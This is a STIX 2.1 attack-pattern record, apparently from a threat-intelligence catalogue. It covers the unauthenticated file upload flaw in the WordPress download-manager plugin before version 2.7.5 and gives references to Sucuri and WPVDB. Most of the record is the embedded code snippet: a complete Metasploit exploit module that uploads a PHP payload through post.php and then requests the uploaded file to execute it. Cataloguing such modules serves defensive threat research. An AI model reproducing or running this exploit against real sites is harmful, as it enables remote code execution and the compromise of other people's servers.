{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1d4192c6-f2d1-4853-9c19-f293311f4c23",
    "created": "2024-08-14T17:12:00.615678Z",
    "modified": "2024-08-14T17:12:00.615682Z",
    "name": "Wordpress Download Manager (download-manager) Unauthenticated File Upload",
    "description": " The WordPress download-manager plugin contains multiple unauthenticated file upload vulnerabilities which were fixed in version 2.7.5. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_downloadmanager_upload.rb",
            "external_id": "wp_downloadmanager_upload.rb"
        },
        {
            "source_name": "reference",
            "url": "http://blog.sucuri.net/2014/12/security-advisory-high-severity-wordpress-download-manager.html"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7706"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(\n    info,\n    'Name'           => 'Wordpress Download Manager (download-manager) Unauthenticated File Upload',\n    'Description'    => %q{\n      The WordPress download-manager plugin contains multiple unauthenticated file upload\n      vulnerabilities which were fixed in version 2.7.5.\n    },\n    'Author'         =>\n    [\n      'Mickael Nadeau',     # initial discovery\n      'Christian Mehlmauer' # metasploit module\n    ],\n    'License'        => MSF_LICENSE,\n    'References'     =>\n    [\n      # The module exploits another vuln not mentioned in this post, but was also fixed\n      ['URL', 'http://blog.sucuri.net/2014/12/security-advisory-high-severity-wordpress-download-manager.html'],\n      ['WPVDB', '7706']\n    ],\n    'Privileged'     => false,\n    'Platform'       => ['php'],\n    'Arch'           => ARCH_PHP,\n    'Targets'        => [['download-manager < 2.7.5', {}]],\n    'DefaultTarget'  => 0,\n    'DisclosureDate' => '2014-12-03'))\n    end\n\n    def check\n      check_plugin_version_from_readme('download-manager', '2.7.5')\n    end\n\n    def exploit\n      filename = \"#{rand_text_alpha(10)}.php\"\n\n      data = Rex::MIME::Message.new\n      data.add_part(payload.encoded, 'application/x-php', nil, \"form-data; name=\\\"Filedata\\\"; filename=\\\"#{filename}\\\"\")\n\n      print_status(\"Uploading payload\")\n      res = send_request_cgi(\n        'method'   => 'POST',\n        'uri'      => normalize_uri(wordpress_url_backend, 'post.php'),\n        'ctype'    => \"multipart/form-data; boundary=#{data.bound}\",\n        'data'     => data.to_s,\n        'vars_get' => { 'task' => 'wpdm_upload_files' }\n      )\n\n      if res && res.code == 200 && res.body && res.body.length > 0 && res.body =~ /#{Regexp.escape(filename)}$/\n        uploaded_filename = res.body\n        register_files_for_cleanup(uploaded_filename)\n        print_good(\"File #{uploaded_filename} successfully uploaded\")\n      else\n        fail_with(Failure::Unknown, \"#{peer} - Error on uploading file\")\n      end\n\n      file_path = normalize_uri(target_uri, 'wp-content', 'uploads', 'download-manager-files', uploaded_filename)\n\n      print_status(\"Calling uploaded file #{file_path}\")\n      send_request_cgi(\n        {\n          'uri'    => file_path,\n          'method' => 'GET'\n        }, 5)\n    end\n  end\n",
    "x_mitre_disclosure_date": "2014-12-03",
    "x_mitre_platforms": [
        "['php']"
    ]
}